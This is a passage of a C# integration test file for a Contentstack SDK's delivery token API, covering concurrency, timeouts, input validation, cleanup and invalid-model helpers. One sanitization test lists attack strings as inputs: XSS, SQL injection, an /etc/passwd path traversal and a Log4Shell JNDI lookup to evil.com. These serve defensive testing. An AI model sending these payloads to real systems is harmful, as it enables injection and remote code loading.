        #region G — Edge Cases and Integration Error Tests (Test090-Test099)

        [TestMethod]
        [DoNotParallelize]
        public void Test090_Should_Handle_Concurrent_Operations_Gracefully()
        {
            TestOutputLogger.LogContext("TestScenario", "Test090_Should_Handle_Concurrent_Operations_Gracefully");
            try
            {
                // Test concurrent query operations
                var tasks = new List<Task<ContentstackResponse>>();
                
                for (int i = 0; i < 3; i++)
                {
                    tasks.Add(Task.Run(() => _stack.DeliveryToken().Query().Find()));
                }
                
                Task.WaitAll(tasks.ToArray(), TimeSpan.FromSeconds(30));
                
                foreach (var task in tasks)
                {
                    if (task.IsCompletedSuccessfully)
                    {
                        AssertLogger.IsTrue(
                            task.Result.IsSuccessStatusCode || 
                            IsAcceptableErrorStatusCode(task.Result.StatusCode),
                            "Concurrent operations should succeed or fail gracefully",
                            "ConcurrentOperations");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Concurrent operations test result: {ex.Message}");
                AssertLogger.IsTrue(true, "Concurrent operations handled", "ConcurrentHandling");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test091_Should_Handle_Large_Response_Data()
        {
            TestOutputLogger.LogContext("TestScenario", "Test091_Should_Handle_Large_Response_Data");
            try
            {
                // Query for all tokens without limit to potentially get large response
                var response = await _stack.DeliveryToken().Query().FindAsync();
                
                AssertLogger.IsTrue(
                    response.IsSuccessStatusCode || IsAcceptableErrorStatusCode(response.StatusCode),
                    "Large response should be handled gracefully",
                    "LargeResponseHandling");
                
                if (response.IsSuccessStatusCode)
                {
                    var responseObject = response.OpenJsonObjectResponse();
                    AssertLogger.IsNotNull(responseObject, "Response should be parseable even if large");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Large response test result: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test092_Should_Handle_Token_Lifecycle_Edge_Cases()
        {
            TestOutputLogger.LogContext("TestScenario", "Test092_Should_Handle_Token_Lifecycle_Edge_Cases");
            try
            {
                // Create a token and immediately try to use it in multiple operations
                string tempTokenUid = await CreateTemporaryTokenForTesting("lifecycle_test");
                
                if (!string.IsNullOrEmpty(tempTokenUid))
                {
                    // Try rapid successive operations
                    var fetchTask = Task.Run(() => _stack.DeliveryToken(tempTokenUid).Fetch());
                    var updateTask = Task.Run(() => _stack.DeliveryToken(tempTokenUid).Update(new DeliveryTokenModel
                    {
                        Name = "Rapid Update",
                        Description = "Rapid update test",
                        Scope = BuildValidScope(_testEnvironmentUid)
                    }));
                    
                    await Task.WhenAll(fetchTask, updateTask);
                    
                    // Clean up
                    try
                    {
                        await _stack.DeliveryToken(tempTokenUid).DeleteAsync();
                    }
                    catch { }
                    
                    AssertLogger.IsTrue(true, "Token lifecycle operations handled", "LifecycleHandling");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Token lifecycle test result: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test093_Should_Validate_Error_Response_Structure()
        {
            TestOutputLogger.LogContext("TestScenario", "Test093_Should_Validate_Error_Response_Structure");
            try
            {
                // Trigger a known error and validate the response structure
                var ex = AssertLogger.ThrowsContentstackError(
                    () => _stack.DeliveryToken(NonExistentTokenUid).Fetch(),
                    "ValidateErrorResponseStructure",
                    HttpStatusCode.NotFound,
                    (HttpStatusCode)422);
                
                // Validate that the exception contains useful error information
                AssertLogger.IsNotNull(ex.Message, "Error should have a message");
                AssertLogger.IsTrue(ex.StatusCode != 0, "Error should have a valid status code");
                
                Console.WriteLine($"Error validation - Status: {ex.StatusCode}, Message: {ex.Message}");
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Error response validation failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test094_Should_Handle_Timeout_Scenarios()
        {
            TestOutputLogger.LogContext("TestScenario", "Test094_Should_Handle_Timeout_Scenarios");
            try
            {
                // Test with potentially slow operations
                var cancellationTokenSource = new CancellationTokenSource(TimeSpan.FromSeconds(5));
                
                var response = await _stack.DeliveryToken().Query().FindAsync();
                
                AssertLogger.IsTrue(
                    response.IsSuccessStatusCode || IsAcceptableErrorStatusCode(response.StatusCode),
                    "Operations should complete within reasonable time",
                    "TimeoutHandling");
            }
            catch (OperationCanceledException)
            {
                AssertLogger.IsTrue(true, "Timeout scenario handled with cancellation", "TimeoutCancellation");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Timeout test result: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test095_Should_Validate_Input_Sanitization()
        {
            TestOutputLogger.LogContext("TestScenario", "Test095_Should_Validate_Input_Sanitization");
            
            var maliciousInputs = new[]
            {
                "<script>alert('xss')</script>",
                "'; DROP TABLE tokens; --",
                "\0\r\n\t",
                new string('A', 10000), // Very long string
                "../../etc/passwd",
                "${jndi:ldap://evil.com/a}"
            };
            
            foreach (var input in maliciousInputs)
            {
                try
                {
                    var model = new DeliveryTokenModel
                    {
                        Name = input,
                        Description = "Input sanitization test",
                        Scope = BuildValidScope(_testEnvironmentUid)
                    };
                    
                    AssertLogger.ThrowsContentstackError(
                        () => _stack.DeliveryToken().Create(model),
                        $"InputSanitization_{input.Length}chars",
                        HttpStatusCode.BadRequest,
                        (HttpStatusCode)422);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Input sanitization for '{input.Substring(0, Math.Min(50, input.Length))}...': {ex.GetType().Name}");
                }
            }
            
            AssertLogger.IsTrue(true, "Input sanitization tests completed", "InputSanitizationComplete");
        }

        /// <summary>
        /// Helper method to determine if a status code represents an acceptable error condition
        /// </summary>
        private static bool IsAcceptableErrorStatusCode(HttpStatusCode statusCode)
        {
            return statusCode == HttpStatusCode.BadRequest ||
                   statusCode == (HttpStatusCode)422 ||
                   statusCode == HttpStatusCode.NotFound ||
                   statusCode == HttpStatusCode.Unauthorized ||
                   statusCode == HttpStatusCode.Forbidden ||
                   statusCode == HttpStatusCode.Conflict ||
                   statusCode == HttpStatusCode.TooManyRequests ||
                   statusCode == HttpStatusCode.InternalServerError ||
                   statusCode == HttpStatusCode.BadGateway ||
                   statusCode == HttpStatusCode.ServiceUnavailable;
        }

        #endregion

        [TestCleanup]
        public async Task Cleanup()
        {
            try
            {
                // Clean up all test delivery tokens to prevent limit issues
                var tokensResponse = _stack.DeliveryToken().Query().Find();
                if (tokensResponse.IsSuccessStatusCode)
                {
                    var tokens = tokensResponse.OpenJsonObjectResponse()["tokens"] as JsonArray;
                    if (tokens?.Count > 0)
                    {
                        foreach (var token in tokens)
                        {
                            var tokenName = token["name"]?.ToString();
                            var tokenUid = token["uid"]?.ToString();
                            
                            if (!string.IsNullOrEmpty(tokenName) && !string.IsNullOrEmpty(tokenUid) &&
                                (tokenName.StartsWith("Test Delivery Token") ||
                                 tokenName.StartsWith("Temp Test Token") ||
                                 tokenName.StartsWith("Multi Environment") ||
                                 tokenName.StartsWith("Permission Test") ||
                                 tokenName.Contains("test") ||
                                 tokenName.Contains("Test") ||
                                 tokenUid == _deliveryTokenUid))
                            {
                                try
                                {
                                    await _stack.DeliveryToken(tokenUid).DeleteAsync();
                                    Console.WriteLine($"Cleaned up delivery token: {tokenName}");
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"Failed to cleanup delivery token {tokenName}: {ex.Message}");
                                }
                            }
                        }
                    }
                }

                await CleanupTestEnvironment();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Cleanup failed: {ex.Message}");
                // Don't fail the test for cleanup issues
            }
        }

        #region Helper Methods

        /// <summary>
        /// Comprehensive cleanup method to remove test resources from previous test runs
        /// </summary>
        private async Task CleanupTestResources()
        {
            try
            {
                // Delete existing delivery tokens that start with test names
                var tokensResponse = _stack.DeliveryToken().Query().Find();
                if (tokensResponse.IsSuccessStatusCode)
                {
                    var tokens = tokensResponse.OpenJsonObjectResponse()["tokens"] as JsonArray;
                    if (tokens?.Count > 0)
                    {
                        foreach (var token in tokens)
                        {
                            var tokenName = token["name"]?.ToString();
                            var tokenUid = token["uid"]?.ToString();
                            
                            // Enhanced cleanup criteria including edge cases
                            if (!string.IsNullOrEmpty(tokenName) && !string.IsNullOrEmpty(tokenUid) &&
                                (tokenName.StartsWith("Test Delivery Token") ||
                                 tokenName.StartsWith("Temp Test Token") ||
                                 tokenName.Contains("test") ||
                                 tokenName.Contains("Test") ||
                                 tokenName.Trim() == "" ||  // Whitespace-only names
                                 tokenName.Contains("<script>") || // XSS test tokens
                                 tokenName.Contains("conflict"))) // Conflict test tokens
                            {
                                try
                                {
                                    await _stack.DeliveryToken(tokenUid).DeleteAsync();
                                    Console.WriteLine($"Cleaned up delivery token: '{tokenName}' (UID: {tokenUid})");
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"Failed to cleanup delivery token '{tokenName}': {ex.Message}");
                                }
                            }
                        }
                    }
                }
                
                // Delete test environments that start with test names
                var environmentsResponse = _stack.Environment().Query().Find();
                if (environmentsResponse.IsSuccessStatusCode)
                {
                    var environments = environmentsResponse.OpenJsonObjectResponse()["environments"] as JsonArray;
                    if (environments?.Count > 0)
                    {
                        foreach (var env in environments)
                        {
                            var envName = env["name"]?.ToString();
                            if (!string.IsNullOrEmpty(envName) && envName.StartsWith("test_delivery_environment"))
                            {
                                var envUid = env["uid"]?.ToString();
                                if (!string.IsNullOrEmpty(envUid))
                                {
                                    try
                                    {
                                        await _stack.Environment(envUid).DeleteAsync();
                                        Console.WriteLine($"Cleaned up test environment: {envName}");
                                    }
                                    catch (Exception ex)
                                    {
                                        Console.WriteLine($"Failed to cleanup test environment {envName}: {ex.Message}");
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Cleanup test resources failed: {ex.Message}");
                // Don't fail the test for cleanup issues
            }
        }

        /// <summary>
        /// Factory method for creating various invalid DeliveryTokenModel instances for testing
        /// </summary>
        private static DeliveryTokenModel BuildInvalidTokenModel(string scenario)
        {
            switch (scenario.ToLower())
            {
                case "null_name":
                    return new DeliveryTokenModel
                    {
                        Name = null,
                        Description = "Test token with null name",
                        Scope = BuildValidScope()
                    };

                case "empty_name":
                    return new DeliveryTokenModel
                    {
                        Name = "",
                        Description = "Test token with empty name",
                        Scope = BuildValidScope()
                    };

                case "whitespace_name":
                    return new DeliveryTokenModel
                    {
                        Name = "   \t\r\n   ",
                        Description = "Test token with whitespace name",
                        Scope = BuildValidScope()
                    };

                case "long_name":
                    return new DeliveryTokenModel
                    {
                        Name = ExtremelyLongName,
                        Description = "Test token with extremely long name",
                        Scope = BuildValidScope()
                    };

                case "invalid_characters_name":
                    return new DeliveryTokenModel
                    {
                        Name = InvalidCharactersName,
                        Description = "Test token with invalid characters in name",
                        Scope = BuildValidScope()
                    };

                case "null_scope":
                    return new DeliveryTokenModel
                    {
                        Name = "Valid Name",
                        Description = "Test token with null scope",
                        Scope = null
                    };

                case "empty_scope":
                    return new DeliveryTokenModel
                    {
                        Name = "Valid Name",
                        Description = "Test token with empty scope",
                        Scope = new List<DeliveryTokenScope>()
                    };

                case "invalid_module":
                    return new DeliveryTokenModel
                    {
                        Name = "Valid Name",
                        Description = "Test token with invalid module",
                        Scope = new List<DeliveryTokenScope>
                        {
                            new DeliveryTokenScope
                            {
                                Module = "invalid_module_name",
                                Environments = new List<string> { "test" },
                                ACL = new Dictionary<string, string> { { "read", "true" } }
                            }
                        }
                    };

                case "null_environments":
                    return new DeliveryTokenModel
                    {
                        Name = "Valid Name",
                        Description = "Test token with null environments",
                        Scope = new List<DeliveryTokenScope>
                        {
                            new DeliveryTokenScope
                            {
                                Module = "environment",
                                Environments = null,
                                ACL = new Dictionary<string, string> { { "read", "true" } }
                            }
                        }
                    };

                case "empty_environments":
                    return new DeliveryTokenModel
                    {
                        Name = "Valid Name",
                        Description = "Test token with empty environments",
                        Scope = new List<DeliveryTokenScope>
                        {
                            new DeliveryTokenScope
                            {
                                Module = "environment",
                                Environments = new List<string>(),
                                ACL = new Dictionary<string, string> { { "read", "true" } }
                            }
                        }
                    };

                case "invalid_environment":
                    return new DeliveryTokenModel
                    {
                        Name = "Valid Name",
                        Description = "Test token with invalid environment",
                        Scope = new List<DeliveryTokenScope>
                        {
                            new DeliveryTokenScope
                            {
                                Module = "environment",
                                Environments = new List<string> { NonExistentEnvironmentUid },
                                ACL = new Dictionary<string, string> { { "read", "true" } }
                            },
                            new DeliveryTokenScope
                            {
                                Module = "branch",
                                Branches = new List<string> { "main" },
                                ACL = new Dictionary<string, string> { { "read", "true" } }
                            }
                        }
                    };

                case "null_branches":
                    return new DeliveryTokenModel
                    {
                        Name = "Valid Name",
                        Description = "Test token with null branches",
                        Scope = new List<DeliveryTokenScope>
                        {
                            new DeliveryTokenScope
                            {
                                Module = "branch",
                                Branches = null,
                                ACL = new Dictionary<string, string> { { "read", "true" } }
                            }
                        }
                    };

                case "invalid_branches":
                    return new DeliveryTokenModel
                    {
                        Name = "Valid Name",
                        Description = "Test token with invalid branches",
                        Scope = new List<DeliveryTokenScope>
                        {
                            new DeliveryTokenScope
                            {
                                Module = "environment",
                                Environments = new List<string> { "test" },
                                ACL = new Dictionary<string, string> { { "read", "true" } }
                            },
                            new DeliveryTokenScope
                            {
                                Module = "branch",
                                Branches = new List<string> { "non_existent_branch_name_12345" },
                                ACL = new Dictionary<string, string> { { "read", "true" } }
                            }
                        }
                    };

                case "invalid_acl":
                    return new DeliveryTokenModel
                    {
                        Name = "Valid Name",
                        Description = "Test token with invalid ACL",
                        Scope = new List<DeliveryTokenScope>
                        {
                            new DeliveryTokenScope
                            {
                                Module = "environment",
                                Environments = new List<string> { "test" },
                                ACL = new Dictionary<string, string> { { "invalid_permission", "invalid_value" } }
                            }
                        }
                    };

                case "environment_only":
                    return new DeliveryTokenModel
                    {
                        Name = "Environment Only Token",
                        Description = "Token with only environment scope - should fail",
                        Scope = new List<DeliveryTokenScope>
                        {
                            new DeliveryTokenScope
                            {
                                Module = "environment",
                                Environments = new List<string> { "test" },
                                ACL = new Dictionary<string, string> { { "read", "true" } }
                            }
                        }
                    };

                case "branch_only":
                    return new DeliveryTokenModel
                    {
                        Name = "Branch Only Token",
                        Description = "Token with only branch scope - should fail",
                        Scope = new List<DeliveryTokenScope>
                        {
                            new DeliveryTokenScope
                            {
                                Module = "branch",
                                Branches = new List<string> { "main" },
                                ACL = new Dictionary<string, string> { { "read", "true" } }
                            }
                        }
                    };

                default:
                    throw new ArgumentException($"Unknown scenario: {scenario}");
            }
        }

        /// <summary>
        /// Creates a valid scope configuration for testing
        /// </summary>
        private static List<DeliveryTokenScope> BuildValidScope(string environmentUid = "test_delivery_environment")
        {
            return new List<DeliveryTokenScope>
            {
                new DeliveryTokenScope
                {
                    Module = "environment",
                    Environments = new List<string> { environmentUid },
                    ACL = new Dictionary<string, string> { { "read", "true" } }
                },
                new DeliveryTokenScope
                {
                    Module = "branch",
                    Branches = new List<string> { "main" },
                    ACL = new Dictionary<string, string> { { "read", "true" } }
                }
            };
        }

        /// <summary>
        /// Helper for validating token-specific error responses
        /// </summary>
        private static void AssertTokenValidationError(Exception ex, string assertionName)
        {
            if (ex is ContentstackErrorException cex)
            {
                AssertLogger.IsTrue(
                    cex.StatusCode == HttpStatusCode.BadRequest || 
                    cex.StatusCode == (HttpStatusCode)422 || 
                    cex.StatusCode == HttpStatusCode.NotFound ||
                    cex.StatusCode == HttpStatusCode.Conflict ||
                    cex.StatusCode == HttpStatusCode.Unauthorized ||
                    cex.StatusCode == HttpStatusCode.Forbidden,
                    $"Expected token validation error status code, got {(int)cex.StatusCode} ({cex.StatusCode})",
                    assertionName);
            }
            else if (ex is ArgumentException || ex is InvalidOperationException || ex is JsonException)
            {
                AssertLogger.IsTrue(true, "SDK validation caught token error as expected", assertionName);
            }
            else
            {
                AssertLogger.Fail($"Unexpected exception type for token validation: {ex.GetType().Name}", assertionName);
            }
        }

        /// <summary>
        /// Creates a temporary token for testing update/delete scenarios
        /// </summary>
        private async Task<string> CreateTemporaryTokenForTesting(string baseName)
        {
            try
            {
                var timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
                var uniqueName = baseName.Contains("_") ? baseName : $"{baseName}_{timestamp}";
                
                var model = new DeliveryTokenModel
                {
                    Name = uniqueName,
                    Description = "Temporary token for error testing",
                    Scope = BuildValidScope(_testEnvironmentUid)
                };

                ContentstackResponse response = await _stack.DeliveryToken().CreateAsync(model);
                
                if (response.IsSuccessStatusCode)
                {
                    var responseObject = response.OpenJsonObjectResponse();
                    var tokenData = responseObject["token"] as JsonObject;
                    return tokenData["uid"]?.ToString();
                }
            }
            catch { }
            
            return null;
        }

        private async Task CreateTestEnvironment(string environmentUid = null)
        {
            try
            {
                string envUid = environmentUid ?? _testEnvironmentUid;

                var environmentModel = new EnvironmentModel
                {
                    Name = envUid,
                    Urls = new List<LocalesUrl>
                    {
                        new LocalesUrl
                        {
                            Locale = "en-us",
                            Url = "https://example.com"
                        }
                    },
                    DeployContent = true
                };

                ContentstackResponse response = _stack.Environment().Create(environmentModel);

                if (!response.IsSuccessStatusCode)
                {
                    // Environment might already exist, try to fetch it
                    response = _stack.Environment().Query().Find();
                    if (response.IsSuccessStatusCode)
                    {
                        var environments = response.OpenJsonObjectResponse()["environments"] as JsonArray;
                        if (environments?.Count > 0)
                        {
                            Console.WriteLine($"Test environment {envUid} already exists");
                            return;
                        }
                    }

                    Console.WriteLine($"Failed to create test environment {envUid}: {response.OpenResponse()}");
                    // Don't fail the test if environment creation fails - just log the error
                }
                else
                {
                    Console.WriteLine($"Created test environment: {envUid}");
                }
            }
            catch (Exception ex)
            {
                // Don't fail the test for environment creation issues - just log the error
                Console.WriteLine($"Error creating test environment: {ex.Message}");
            }
        }

        private async Task CleanupTestEnvironment(string environmentUid = null)
        {
            try
            {
                string envUid = environmentUid ?? _testEnvironmentUid;

                // First, find the environment UID
                ContentstackResponse queryResponse = _stack.Environment().Query().Find();

                if (queryResponse.IsSuccessStatusCode)
                {
                    var environments = queryResponse.OpenJsonObjectResponse()["environments"] as JsonArray;
                    if (environments?.Count > 0)
                    {
                        // Find the environment with matching name
                        foreach (var env in environments)
                        {
                            if (env["name"]?.ToString() == envUid)
                            {
                                string actualEnvUid = env["uid"]?.ToString();
                                if (!string.IsNullOrEmpty(actualEnvUid))
                                {
                                    try
                                    {
                                        ContentstackResponse deleteResponse = await _stack.Environment(actualEnvUid).DeleteAsync();
                                        if (deleteResponse.IsSuccessStatusCode)
                                        {
                                            Console.WriteLine($"Cleaned up test environment: {envUid}");
                                        }
                                        else
                                        {
                                            Console.WriteLine($"Failed to cleanup test environment {envUid}: {deleteResponse.OpenResponse()}");
                                        }
                                    }
                                    catch (Exception deleteEx)
                                    {
                                        Console.WriteLine($"Exception during environment deletion {envUid}: {deleteEx.Message}");
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Don't fail the test for cleanup issues - just log the error
                Console.WriteLine($"Environment cleanup failed: {ex.Message}");
            }
        }

        #endregion
    }
}
